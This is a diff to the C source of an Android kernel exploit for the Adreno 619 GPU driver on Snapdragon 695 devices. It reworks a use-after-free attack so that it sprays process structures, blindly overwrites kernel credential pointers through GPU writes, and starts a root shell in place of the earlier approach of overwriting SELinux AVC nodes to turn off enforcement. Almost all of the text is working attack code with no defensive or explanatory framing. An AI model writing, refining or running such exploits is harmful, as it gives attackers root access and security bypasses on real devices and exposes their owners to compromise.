@@ -17,11 +17,10 @@
 #include <time.h>
 #include <signal.h>
 #include <dirent.h>
+#include <poll.h>
 
 static int kgsl_fd = -1;
-static volatile int race_done = 0;
 static uint64_t alloc_flags = 0;
-static int uaf_id = -1;
 
 static void die(const char *msg) { perror(msg); exit(1); }
 
@@ -171,71 +170,35 @@ static void gpu_write_kernel(uint64_t va, uint64_t val,
     }
 }
 
-/* ==================== setenforce 0 check ==================== */
-static int try_setenforce0(void) {
-    int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
-    if (fd < 0) return 0;
-    ssize_t w = write(fd, "0", 1);
-    close(fd);
-    return (w == 1);
-}
-
-/* ==================== Trigger AVC allocations ==================== */
-static void trigger_avc_allocations(void) {
-    printf("[*] Triggering AVC allocations by accessing files...\n");
-    // Access many files to cause SELinux checks and allocate avc_nodes
-    const char *paths[] = {
-        "/sys/fs/selinux/enforce",
-        "/proc/self/attr/current",
-        "/dev/null",
-        "/system/bin/sh",
-        "/data/local/tmp/avc_bypass",
-        "/proc/version",
-        "/sys/kernel/notes",
-        "/proc/meminfo",
-        "/dev/urandom",
-        "/system/etc/hosts",
-        "/vendor/etc/hosts",
-        "/apex/com.android.runtime/bin/linker64",
-        "/data/misc/wifi/wpa_supplicant.conf",
-        "/data/system/packages.xml",
-        "/proc/self/fd",
-        "/proc/self/maps",
-        "/sys/class/kgsl/kgsl-3d0/",
-        "/dev/kgsl-3d0",
-        NULL
-    };
-    for (int i = 0; paths[i]; i++) {
-        int fd = open(paths[i], O_RDONLY);
-        if (fd >= 0) close(fd);
-        usleep(100);
-    }
-    // Also try to do some operations that cause AVC denials
-    for (int i = 0; i < 100; i++) {
-        int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
-        if (fd >= 0) {
-            write(fd, "1", 1);
-            close(fd);
-        }
-        usleep(50);
-    }
-    printf("[*] AVC triggers done.\n");
-}
-
-/* ==================== Spray children (task_struct) ==================== */
+/* ==================== Root shell detection ==================== */
 static pid_t spray_pids[SPRAY_PIDS];
 static int n_spray = 0;
 
-static void spawn_spray(void) {
+static void spawn_spray(int notify_pipe) {
     printf("[SPRAY] Spawning child processes...\n");
     for (int i = 0; i < SPRAY_PIDS; i++) {
         pid_t p = fork();
         if (p == 0) {
+            // Child: periodically check uid, if 0 then notify parent and spawn shell
             prctl(PR_SET_NAME, "UAF_SPRAY");
-            for (;;) usleep(200000);
+            int uid;
+            for (int j = 0; j < 600; j++) { // 60 seconds max
+                uid = getuid();
+                if (uid == 0) {
+                    // Notify parent
+                    write(notify_pipe, &p, sizeof(p));
+                    // Spawn shell
+                    execl("/system/bin/sh", "sh", NULL);
+                    _exit(0);
+                }
+                usleep(100000);
+            }
+            _exit(0);
+        } else if (p > 0) {
+            spray_pids[n_spray++] = p;
+        } else {
+            break;
         }
-        if (p > 0) spray_pids[n_spray++] = p;
-        else break;
     }
     printf("[SPRAY] %d children spawned.\n", n_spray);
 }
@@ -248,14 +211,14 @@ static void kill_spray_children(void) {
 /* ==================== Main ==================== */
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("[*] avc_bypass for Snapdragon 695 (Adreno 619)\n");
-    printf("[*] Strategy: UAF + task_struct spray + blind AVC node overwrite\n");
+    printf("[*] avc_bypass for Snapdragon 695 (Adreno 619) - Cred overwrite method\n");
+    printf("[*] Strategy: UAF + task_struct spray + blind cred pointer overwrite\n");
 
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    /* KASLR detection (for reference) */
+    /* KASLR detection */
     uint64_t kaslr = detect_kaslr();
     if (!kaslr) { printf("[-] KASLR detection failed\n"); close(kgsl_fd); return 1; }
     printf("[+] KASLR = 0x%lx\n", kaslr);
@@ -265,16 +228,11 @@ int main(int argc, char **argv) {
     /* Use non-CPU-mapped objects for UAF */
     alloc_flags = KGSL_CACHEMODE_WRITEBACK;
 
-    /* Phase 1: Allocate large object (UAF_SIZE) */
+    /* Phase 1: Allocate large object */
     printf("[*] Phase 1: Allocating large GPU object (UAF_SIZE=0x%lx)\n", UAF_SIZE);
-    uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
+    int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
     uint64_t uaf_gpuaddr = 0;
     gpuobj_info(uaf_id, &uaf_gpuaddr);
-    if (uaf_gpuaddr == 0) {
-        printf("[-] Large object gpuaddr=0 (should not happen with non-CPU-mapped)\n");
-        close(kgsl_fd);
-        return 1;
-    }
     printf("[+] Large object id=%d gpuaddr=0x%lx\n", uaf_id, uaf_gpuaddr);
 
     /* Phase 2: Free large object */
@@ -282,7 +240,7 @@ int main(int argc, char **argv) {
     gpuobj_free(uaf_id);
     printf("[+] Freed\n");
 
-    /* Phase 3: Reclaim memory (compact and drop caches) */
+    /* Phase 3: Reclaim memory */
     printf("[*] Phase 3: Reclaim memory\n");
     int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
     if (rf >= 0) { write(rf, "1", 1); close(rf); }
@@ -290,11 +248,18 @@ int main(int argc, char **argv) {
     if (rf >= 0) { write(rf, "3", 1); close(rf); }
     usleep(10000);
 
-    /* Phase 4: Spawn task_struct spray */
-    spawn_spray();
+    /* Phase 4: Create pipe for notification */
+    int pipefd[2];
+    if (pipe(pipefd) < 0) die("pipe");
+    fcntl(pipefd[0], F_SETFD, FD_CLOEXEC);
+    fcntl(pipefd[1], F_SETFD, FD_CLOEXEC);
 
-    /* Phase 5: Allocate small object to reuse the same GPU address */
-    printf("[*] Phase 5: Allocate small object (OVERLAP_SIZE=0x%x) to reuse address\n", OVERLAP_SIZE);
+    /* Phase 5: Spawn task_struct spray */
+    spawn_spray(pipefd[1]);
+    close(pipefd[1]); // close write end in parent
+
+    /* Phase 6: Allocate small object to reuse the same GPU address */
+    printf("[*] Phase 6: Allocate small object (OVERLAP_SIZE=0x%x) to reuse address\n", OVERLAP_SIZE);
     int ov_id = -1;
     uint64_t ov_gpuaddr = 0;
     for (int attempt = 0; attempt < 100; attempt++) {
@@ -316,9 +281,6 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    /* Phase 6: Trigger AVC allocations */
-    trigger_avc_allocations();
-
     /* Phase 7: Prepare GPU context and IB for writing */
     printf("[*] Phase 7: Prepare GPU context and IB\n");
     unsigned int ctx_id = create_context();
@@ -328,57 +290,44 @@ int main(int argc, char **argv) {
     gpuobj_info(ib_id, &ib_ga);
     printf("[GPU] ctx=%u ib_ga=0x%lx\n", ctx_id, ib_ga);
 
-    /* Phase 8: Blindly write to all possible avc_node allowed fields in the overlapped page */
-    printf("[*] Phase 8: Blindly writing allowed=0xFFFFFFFF to potential avc_nodes\n");
-    uint64_t start = ov_gpuaddr;                 // start of the page
-    uint64_t end = ov_gpuaddr + OVERLAP_SIZE;    // one page
-    int writes = 0;
-    for (uint64_t va = start; va < end - 72; va += 72) {
-        uint64_t target = va + 0xc; // allowed field offset in avc_node
-        gpu_write_kernel(target, 0xFFFFFFFF, ib_ga, ib_m, ctx_id, ib_id);
-        writes++;
-    }
-    printf("[*] Wrote %d potential AVC nodes in the overlapped page.\n", writes);
-
-    /* Also write to neighboring pages (within the large object range) */
-    printf("[*] Expanding to neighboring pages...\n");
+    /* Phase 8: Blindly overwrite cred pointers in the overlapped page(s) */
+    printf("[*] Phase 8: Blindly writing init_cred_addr (0x%lx) to all 8-byte aligned offsets in overlapped pages\n", init_cred_addr);
     uint64_t base = ov_gpuaddr;
-    for (int page_offset = -10; page_offset <= 10; page_offset++) {
-        if (page_offset == 0) continue;
-        uint64_t page_va = base + page_offset * 0x1000;
+    int writes = 0;
+    // We'll cover the overlapped page and a few surrounding pages within the large object
+    for (int page_off = -5; page_off <= 5; page_off++) {
+        uint64_t page_va = base + page_off * 0x1000;
         if (page_va < uaf_gpuaddr || page_va >= uaf_gpuaddr + UAF_SIZE) continue;
-        for (uint64_t va = page_va; va < page_va + 0x1000 - 72; va += 72) {
-            uint64_t target = va + 0xc;
-            gpu_write_kernel(target, 0xFFFFFFFF, ib_ga, ib_m, ctx_id, ib_id);
+        // Write init_cred_addr to every 8-byte aligned offset in the page, skipping zero page?
+        for (uint64_t off = 0x100; off < 0x1000; off += 8) { // skip first 0x100 bytes (page header)
+            uint64_t target = page_va + off;
+            gpu_write_kernel(target, init_cred_addr, ib_ga, ib_m, ctx_id, ib_id);
             writes++;
         }
     }
     printf("[*] Total writes: %d\n", writes);
+    __sync_synchronize();
+    usleep(100000);
 
-    /* Phase 9: Try setenforce 0 */
-    printf("[*] Phase 9: Trying setenforce 0\n");
-    int ok = try_setenforce0();
-    if (!ok) {
-        printf("[!] First attempt failed, waiting and retrying...\n");
-        sleep(1);
-        ok = try_setenforce0();
-    }
-
-    if (ok) {
-        printf("[+] ### SETENFORCE 0 SUCCEEDED — SELinux permissive ###\n");
+    /* Phase 9: Wait for root notification from children */
+    printf("[*] Phase 9: Waiting for root shell...\n");
+    struct pollfd pfd = { .fd = pipefd[0], .events = POLLIN };
+    pid_t winner = 0;
+    if (poll(&pfd, 1, 30000) > 0 && read(pipefd[0], &winner, sizeof(winner)) == sizeof(winner)) {
+        printf("[+] ROOT! PID %d\n", winner);
+        // Kill other children
+        for (int i = 0; i < n_spray; i++) {
+            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
+        }
+        while (waitpid(-1, NULL, WNOHANG) > 0);
+        // Wait for the root child to become a shell (it execs)
+        waitpid(winner, NULL, 0);
+        printf("[+] Root shell exited.\n");
     } else {
-        printf("[-] SELinux still enforcing. AVC nodes may not have been overwritten.\n");
-    }
-
-    /* Final status */
-    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
-    if (fd >= 0) {
-        char v[8]; ssize_t n = read(fd, v, sizeof(v)-1);
-        close(fd);
-        if (n > 0) { v[n] = 0; printf("[*] getenforce: %s\n", v); }
+        printf("[-] No child became root within timeout.\n");
     }
 
     kill_spray_children();
     close(kgsl_fd);
-    return ok ? 0 : 1;
+    return 0;
 }
